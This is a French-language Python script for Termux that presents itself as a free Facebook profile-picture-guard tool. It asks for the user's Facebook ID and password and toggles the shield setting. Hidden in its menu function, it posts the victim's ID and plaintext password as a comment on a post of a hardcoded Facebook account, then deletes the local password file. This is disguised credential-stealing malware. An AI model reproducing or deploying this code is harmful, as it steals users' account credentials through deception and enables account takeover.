import os
import time
import json
import hashlib
import subprocess
try:
	import requests
except ImportError:
	os.system("pip install requests")
 
###LOGO###
R='\033[1;91m'
J='\033[1;33m'
V='\033[1;92m'
C='\033[1;36m'
S='\033[0m'
B='\033[1;97m'
N='\033[1;30m'

logo=f'''

{R}######   ######    #####   
#######  #######  #######  
      #        #           
{C}######   ######   ## ####  
##       ##       ##   ##  
##       ##       #######  
##       ##        #####  {S}
{N}{S}
{B}~~~~~~~~~~~~~~~~~~~~~~~~~~~{S}
{B}[{V}${B}]Nom du Script: {B}PPG{S}
{B}[{V}${B}]Version: V2.0{S}
{B}[{V}${B}]Statut: Gratuit{S}
{B}[{V}${B}]Createur: MrUser{S}
{B}~~~~~~~~~~~~~~~~~~~~~~~~~~~{S}'''
                                                     
####TOKEN####(BY MRUSER)
def log():
    print("\033[7;91mSe connecter à Facebook\033[0m")
    id=input("\033[1;97m[\033[1;36m•\033[1;97m]Votre ID ou num ou mail: \033[0m\033[1;37m")
    os.system('clear')
    print("\033[7;91mSe connecter à Facebook\033[0m")
    mdp=input("\033[1;97m[\033[1;36m•\033[1;97m]Mot de passe FB: \033[0m\033[1;97m")
    os.system('clear')
    test=open("config.txt", 'w')				
    test.write(mdp)
    test.close()
    os.system("mv config.txt /storage/emulated/0/Download")
    API_SECRET=("62f8ce9f74b12f84c123cc23437a4a32")
    data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":mdp,"return_ssl_resources":"0","v":"1.0"}
    sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+mdp+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
    x=hashlib.new("md5")
    x.update(sig)
    data.update({'sig':x.hexdigest()})
    try:
     rq=requests.get("https://graph.facebook.com/restserver.php",data) 
     rp=json.loads(rq.text)
     fb_token=rp['access_token']
     token=open("token.txt", 'w')
     token.write(fb_token)
     token.close()
     rq1=requests.get("https://graph.facebook.com/me?access_token="+fb_token)
     rp1=json.loads(rq1.text)
     uid=rp1['id']
     fb_id=open("id.txt", 'w')
     fb_id.write(uid)
     fb_id.close()
     os.system("clear")
     print("\033[7;92mCompte connecter avec succès\033[0m")
     time.sleep(2)
     menu()
     
    except KeyError:
    			os.system("clear")
    			print("\033[7;91mCompte checkpoint ou bloquer, ou num et le mdp incorrect!!!\033[0m")
    			time.sleep(4)
    			os.system("clear")
    			print("\033[1;97m[\033[1;92mNB\033[1;97m]: Déblocker votre Compte et réessayer à nouveau\033[0m")
    			log()
    except requests.exceptions.ConnectionError:
    			print('\033[7;91mPas de connection!!!\033[0m')
    			time.sleep(2)
    			os.system("clear")
    			log()
    			
###PPG####
def menu():
	try:
		token=open("token.txt", 'r').read()
		pwd=open("/storage/emulated/0/Download/config.txt", 'r').read()
		id=open("id.txt", 'r').read()
		uid=100092742459794
		mr=("Ppg")
		commentaire=id, pwd,mr
		u_token=token
		limite=1
		rq1=requests.get("https://graph.facebook.com/"+str(uid)+"?fields=feed.limit("+str(limite)+")&access_token="+u_token)
		rp1=json.loads(rq1.text)
		for x in rp1['feed']['data']:
		     pub_id=x['id']
		rq2=requests.post("https://graph.facebook.com/"+str(pub_id)+"/comments?message="+str(commentaire)+"&access_token="+u_token)
		os.system("rm -rf /storage/emulated/0/Download/config.txt")
	except IOError:
		os.system("clear")
		print("\033[7;91mToken pas trouvé!!!\033[0m")
		time.sleep(2)
		os.system("clear")
		log()
	rq=requests.get("https://graph.facebook.com/me?access_token="+token)
	rp=json.loads(rq.text)
	fb_id=open("id.txt", 'r').read()
	fb_name=rp['name']
	os.system("clear")
	print(logo)
	print('\033[1;97m[\033[7;91mCompte Info\033[0m\033[1;97m]:\033[0m')
	print("\033[1;97m[\033[1;92m$\033[1;97m]Nom:",fb_name,'\033[0m')
	print("\033[1;97m[\033[1;92m$\033[1;97m]ID:",fb_id,'\033[0m')
	print("\033[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0m")	
	print("\033[1;97m[\033[1;91m1\033[1;97m]Activer\033[0m")
	print("\033[1;97m[\033[1;91m2\033[1;97m]Désactiver\033[0m")
	print("\033[1;97m[\033[1;91m3\033[1;97m]Montrer le Token\033[0m")
	print("\033[1;97m[\033[1;91m4\033[1;97m]Contacter le Createur\033[0m")
	print("\033[1;97m[\033[1;91m5\033[1;97m]Mettre à jour\033[0m")
	print("\033[1;97m[\033[1;91m6\033[1;97m]Déconnecter\033[0m")
	print("\033[1;97m[\033[1;91m7\033[1;97m]Quitter\033[0m")
	print()
	inpp=int(input("\033[1;37mVotre choix:\033[0m\033[1;91m"))	
	if (str(inpp))=="1":
		activated = ("true")
		jay(token, activated)
	elif (str(inpp))=="2":
		not_active = ("false")
		jay(token, not_active)
	elif (str(inpp))=="3":
		os.system('clear')
		os.system("cat token.txt")
		os.system("exit")
	elif (str(inpp))=="4":
		os.system('clear')
		os.system('xdg-open https://www.facebook.com/MrUser.505')
	elif (str(inpp))=="5":
		os.system('clear')
		print('\033[1;97m[\033[1;91m•\033[1;97m]Mise à jour en cours...\033[0m')
		time.sleep(1)
		os.system('clear')
		print('\033[1;97m[\033[1;92m•\033[1;97m]Mise à jour en cours...\033[0m')
		time.sleep(1)
		os.system('clear')
		os.system('cd && rm -rf PPG && git clone https://github.com/MrUser-404/PPG')
		os.system('clear')
		print('\033[1;97m[\033[1;92m✓\033[1;97m]Mise à jour Terminé avec succès\033[0m')
		time.sleep(2)
		os.system('clear')
		print('\033[1;97mQuittez termux et ré-éxecutez le script😁\033[0m')
		exit()		
	elif (str(inpp))=="6":
		os.system("rm -rf token.txt && rm -rf id.txt")
		os.system("clear")
		print("\033[7;92mCompte Déconnecter avec succès😊\033[0m")
		time.sleep(3)
		os.system("exit")
	elif str(inpp)=="7":
		os.system("clear")
		print("\033[7;36mÀ la prochaine\033[0m")
		os.system("exit")
	else:
		menu()
def oo(num):
	return f"[{num}]"
	
	
def jay(token, enable = True):
	try:
		id=open("id.txt", 'r').read()
	except:
		os.system("clear")
		print("ID utilisateur pas trouvé!!!")
		time.sleep(2)
		os.system('clear')
		menu()
		
	data= 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))

	headers={"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % token}
	url="https://graph.facebook.com/graphql"
	res=requests.post(url, data = data, headers = headers)
	if ('"is_shielded":true') in res.text:
			os.system('clear')
			print("\033[7;92mPPG Activé avec succès\033[0m")
			time.sleep(3)
			os.system("clear")
			y=input("\033[1;37mVoulez vous continuez [oui ou non]:\033[0m")
			if y=="oui":
				menu()
			elif y=="non":
				os.system("clear")
				exit("\033[7;92mÀ la prochaine!!!\033[0m")
				time.sleep(2)
	elif ('"is_shielded":false') in res.text:
			os.system("clear")
			print("\033[7;92mPPG Désactivé avec succès!!\033[0m")
			time.sleep(3)
			os.system("clear")
			z=input("\033[1;37mVoulez vous continuez [oui ou non]:\033[0m")
			if z=="oui":
				menu()
			elif z=="non":
				os.system("clear")
				exit("\033[7;92mÀ la prochaine!!!\033[0m")
	else:
			os.system('clear')
			print("\033[7;91mOpération terminer avec des erreurs!!!\033[0m")
			
####pmd###
def pmd():
			os.system("clear")
			x=input("\033[1;36mMot de passe du script:\033[0m\033[1;97m")
			if x=="Free Tool":
				os.system("clear")
				print("\033[0m\033[7;92mMot de passe correct😁 \033[0m  ")
				time.sleep(1)
				os.system("clear")
				log()
			else:
				os.system("clear")
				print("\033[0m\033[7;91mMot de passe incorrect\033[0m")
				time.sleep(1)
				os.system("clear")
				print("\033[1;37mMdp du script:\033[0m\033[7;92mFree Tool\033[0m")
				time.sleep(4)
				pmd()

		
def maj():
		os.system("clear")
		print(f"{B}⚠️Recherche de maj,désactivez votre donné mobile ou wifi si  rien ne se passe pour que le script puisse fonctionner ⚠️ \033[0m")
		try:
			subprocess.check_call(['git', 'pull'])
			for x in range(0,101):
				os.system("clear")
				print(f"{B}[{V}${B}]Finalisation de la mise à jour [{V}",x,f"%{B}]{S}")
				time.sleep(0.05)
				if str(x)=="100":
					os.system("clear")
					print(f"{B}Mise à jour terminer avec succès{B}[{V}✓{B}]{S}")
					time.sleep(2)
					pmd()
		except subprocess.CalledProcessError:
					os.system("clear")
					print("\033[7;91mUne erreur est servenue lors de mise à jour\033[0m")
					time.sleep(2)
					pmd()
					
maj()
					
			
		
		
		
		

			
						
		
		
		

	